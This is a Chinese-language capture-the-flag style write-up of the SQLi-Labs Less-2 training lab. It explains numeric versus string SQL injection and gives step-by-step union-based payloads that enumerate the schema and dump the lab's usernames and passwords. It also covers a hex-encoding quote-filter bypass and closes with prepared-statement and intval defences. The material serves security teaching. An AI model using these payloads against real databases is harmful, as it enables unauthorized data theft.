# SQLi-Labs Less-2 数字型注入 通关笔记

> Less-1 和 Less-2 查的是同一张表、同一个库、同一批数据。
>
> **唯一的区别：后台少写了一对引号。**
>
> 这一篇把两关放在一起对照着看。

---

## 一、这题在干什么

| 项目 | 内容 |
| --- | --- |
| 靶场 | SQLi-Labs |
| 关卡 | Less-2 (Error Based - Intiger based) |
| 地址 | `http://localhost/sqli-labs/Less-2/` |
| 参数 | `id`（GET） |
| 类型 | **数字型注入**（后台没有引号包裹） |
| 目标 | 把 `security.users` 表里的账号密码读出来 |

**和 Less-1 完全一样的表、一样的库、一样的字段。**

---

## 二、和 Less-1 的第一处差别：判断方法

### 2.1 后台写法对照

```php
// Less-1（字符型）
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
                                    ↑  ↑
                                 有引号包裹

// Less-2（数字型）
$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1";
                                    ↑
                                 没有引号
```

### 2.2 四个测试的实际结果

| 测试 | Less-1 | Less-2 |
| --- | --- | --- |
| `?id=1` | 正常，Dumb | 正常，Dumb |
| `?id=1'` | 报错 | 报错 |
| **`?id=1' --+`** | **恢复正常** | **仍然报错** |
| `?id=1 --+` | 正常 | **正常** |

### 2.3 怎么读这张表

**关键看第三行：**

| 现象 | 结论 |
| --- | --- |
| `' --+` 能恢复 | **字符型** —— 引号被你的 `'` 闭合了 |
| `' --+` 还报错，但 `--+` 单独正常 | **数字型** —— 引号配不上对 |

### 2.4 为什么数字型加引号永远救不回来

```sql
-- 输入 1'
WHERE id=1' LIMIT 0,1
         ↑
     孤零零一个引号，没有配对的

-- 输入 1' --+
WHERE id=1' --+ LIMIT 0,1
         ↑
     引号还在！注释删不掉它
```

**`--` 只对它后面的内容生效，管不了前面的那个引号。**

**所以数字型：加一个引号必报错，加什么都救不回来。**

---

## 三、我的解题步骤

### 步骤 1：正常查询

```
http://localhost/sqli-labs/Less-2/?id=1
```

返回：

```
Your Login name:Dumb
Your Password:Dumb
```

### 步骤 2：加引号，确认是数字型

```
?id=1'          → 报错
?id=1' --+      → 仍然报错
?id=1 --+       → 正常
```

**三个结果一起看，判定为数字型，不需要闭合。**

### 步骤 3：数有几列

```
?id=1 order by 3 --+     → 正常
?id=1 order by 4 --+     → 报错
```

**3 列。**

### 步骤 4：找哪几列会显示

```
?id=-1 union select 1,2,3 --+
```

实测返回：

```
Your Login name:2
Your Password:3
```

**第 2、3 列会回显。**

### 步骤 5：爆库名和版本

```
?id=-1 union select 1,database(),version() --+
```

实测返回：

```
Your Login name:security
Your Password:5.7.26
```

### 步骤 6：爆表名

```
?id=-1 union select 1,group_concat(table_name),3
from information_schema.tables where table_schema=database() --+
```

实测返回：

```
Your Login name:emails,referers,uagents,users
Your Password:3
```

### 步骤 7：爆字段名

```
?id=-1 union select 1,group_concat(column_name),3
from information_schema.columns where table_name='users' and table_schema=database() --+
```

实测返回：

```
Your Login name:id,username,password
```

> **踩坑记录：** 第一次我漏写了 `and table_schema=database()`，结果返回了一大串：
>
> ```
> USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password,level,id,username,password,level,...
> ```
>
> 原因是**多个库里都有叫 `users` 的表**（`security`、`challenges`、还有 MySQL 自带的 `mysql.user`）。
>
> **必须用 `table_schema=database()` 限定当前库。**

### 步骤 8：取数据

```
?id=-1 union select 1,group_concat(username,0x3a,password),3 from users --+
```

实测返回：

```
Your Login name:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,
secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,
admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,
dhakkan:dumbo,admin4:admin4
```

### 步骤 9：登录通关

拿 `admin` / `admin` 登录后台。

---

## 四、原理分析

### 4.1 为什么数字型不需要闭合

**回到"值区 / 代码区"的概念：**

```
字符型（Less-1）：
  SELECT * FROM users WHERE id = ' ..... ' LIMIT 0,1
                                 ^^^^^^^
                              你站在值区里
  → 必须先加 ' 把自己"放出来"

数字型（Less-2）：
  SELECT * FROM users WHERE id = ....... LIMIT 0,1
                                ^^^^^^^
                              你本来就站在代码区
  → 不需要闭合，直接写 union 就行
```

**这一点很关键：**

> **数字型不是"更安全"，而是"根本没有保护"。**
> 引号至少还把你关在值区里，数字型连这层"墙"都没有。

### 4.2 为什么 `--+` 还是要加

虽然不用闭合引号，但**后面的 `LIMIT 0,1` 还在**：

```sql
-- 不加注释
SELECT * FROM users WHERE id=-1 union select 1,2,3 LIMIT 0,1

-- 这条其实能跑，但 LIMIT 会作用在整个 union 结果上
```

**加了 `--+`，把 `LIMIT 0,1` 注释掉，结果更干净、更可控。**

```sql
SELECT * FROM users WHERE id=-1 union select 1,2,3 --+ LIMIT 0,1
```

### 4.3 为什么 `id=-1`

```sql
-- id=1
第一行：Dumb / Dumb    ← 原生查询
第二行：2 / 3          ← union 结果

-- id=-1（不存在）
第一行：2 / 3          ← 只剩 union
```

**让原生查询查空，页面只显示你注入的内容。**

---

## 五、Less-1 vs Less-2 全面对比

### 5.1 一句话对比

| | Less-1 | Less-2 |
| --- | --- | --- |
| 类型 | 字符型（String） | **数字型（Integer）** |
| 后台写法 | `id='$id'` | `id=$id` |
| 需要闭合吗 | **需要 `'`** | **不需要** |
| 判断标志 | `' --+` 能恢复 | `' --+` 仍报错 |

### 5.2 payload 逐句对照

| 步骤 | Less-1 | Less-2 |
| --- | --- | --- |
| 判断 | `?id=1'` | `?id=1'` |
| 恢复 | `?id=1' --+` | `?id=1 --+` |
| 数列数 | `?id=1' order by 3 --+` | `?id=1 order by 3 --+` |
| 找显位 | `?id=-1' union select 1,2,3 --+` | `?id=-1 union select 1,2,3 --+` |
| 爆库 | `?id=-1' union select 1,database(),3 --+` | `?id=-1 union select 1,database(),3 --+` |
| 爆表 | `...database() --+` | 同左，去掉 `'` |
| 爆字段 | `...table_name='users' --+` | 同左 |
| 取数据 | `...from users --+` | 同左 |

**看出来了吗：Less-2 就是 Less-1 把所有 `1'` 换成 `1`。**

### 5.3 差异汇总

| 维度 | Less-1 | Less-2 |
| --- | --- | --- |
| 注入类型 | 字符型 | 数字型 |
| 闭合字符 | `'` | 无 |
| payload 长度 | 多一个 `'` | 更短 |
| 判断难度 | 中 | 中（要试三次） |
| 利用难度 | 一样 | 一样 |
| 结果 | 同一批数据 | 同一批数据 |
| 危险程度 | 高 | **同样高，甚至更直接** |

### 5.4 最容易犯的错

| 错误 | 后果 |
| --- | --- |
| 数字型还习惯性加 `'` | 永远报错，打不通 |
| 字符型忘了加 `'` | 永远报错，打不通 |
| 以为"数字型更安全" | 错，它连引号保护都没有 |
| 爆字段时忘了限定库名 | 查出好几个库的同名表 |

---

## 六、知识点与笔记

### 6.1 数字型 vs 字符型的判断口诀

> **加 `'` 报错、加 `' --+` 能恢复** → 字符型
>
> **加 `'` 报错、加 `' --+` 还报错、但 `--+` 正常** → 数字型

### 6.2 闭合方式速查

| 后台写法 | 类型 | payload 开头 |
| --- | --- | --- |
| `id=$id` | 数字型 | `-1 union select ...` |
| `id='$id'` | 字符型 | `-1' union select ...` |
| `id="$id"` | 字符型 | `-1" union select ...` |
| `id=($id)` | 数字型 | `-1) union select ...` |
| `id=('$id')` | 字符型 | `-1') union select ...` |

### 6.3 为什么爆字段要加 `table_schema`

`information_schema.columns` 存的是**所有库**的所有字段。

如果只按 `table_name='users'` 过滤，会查出：

- `security.users` 的字段
- `challenges.users` 的字段
- `mysql.user` 的字段

**结果混在一起，看不清。**

**加上 `and table_schema=database()` 才是"当前库"。**

### 6.4 `0x7573657273` 是什么

`'users'` 的十六进制（ASCII）。

```sql
where table_name=0x7573657273
-- 等价于
where table_name='users'
```

**有些场景引号被过滤，用十六进制就能绕过。**

### 6.5 常用函数

| 函数 | 作用 |
| --- | --- |
| `database()` | 当前库名 |
| `version()` | 版本 |
| `group_concat()` | 多行拼一行 |
| `concat()` | 拼接 |
| `0x3a` | 冒号 `:` 的十六进制 |

---

## 七、防御怎么写

### 7.1 数字型也要防

**很多人以为"数字型不用防"——这是错的。**

```php
// 危险
$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1";

// 正确
$stmt = $mysqli->prepare("SELECT * FROM users WHERE id=? LIMIT 0,1");
$stmt->bind_param('i', $id);
$stmt->execute();
```

### 7.2 类型转换

```php
$id = intval($_GET['id']);
$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

**`intval("1 union select...")` 会变成 `1`，注入直接失效。**

### 7.3 为什么预编译是根本解

```
预编译：SELECT * FROM users WHERE id = ?
```

**数据库在执行前就把结构定死了，`?` 只等着填一个"值"。**

**不管你是字符型还是数字型，输入都只能当值。**

---

## 八、总结

### 九步表

| 步骤 | payload | 结果 |
| --- | --- | --- |
| 1 | `?id=1` | 正常 |
| 2 | `?id=1'` / `?id=1' --+` / `?id=1 --+` | 判定数字型 |
| 3 | `?id=1 order by 3/4 --+` | 3 列 |
| 4 | `?id=-1 union select 1,2,3 --+` | 显位 2、3 |
| 5 | `?id=-1 union select 1,database(),3 --+` | security |
| 6 | `information_schema.tables` | users |
| 7 | `information_schema.columns` + `table_schema=database()` | id,username,password |
| 8 | `from users` | 全部账号密码 |

### 一句话

> **Less-2 就是 Less-1 去掉一个引号。**
>
> **但"去掉引号"不是"更安全"——是"连最后的墙都没了"。**
>
> **数字型不需要闭合，因为你本来就站在代码区。**

---

## 参考

- [sqli-labs GitHub](https://github.com/Audi-1/sqli-labs)
- [sqli-labs php7 兼容版](https://github.com/happygongzhuo/sqli-labs-php7)
- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
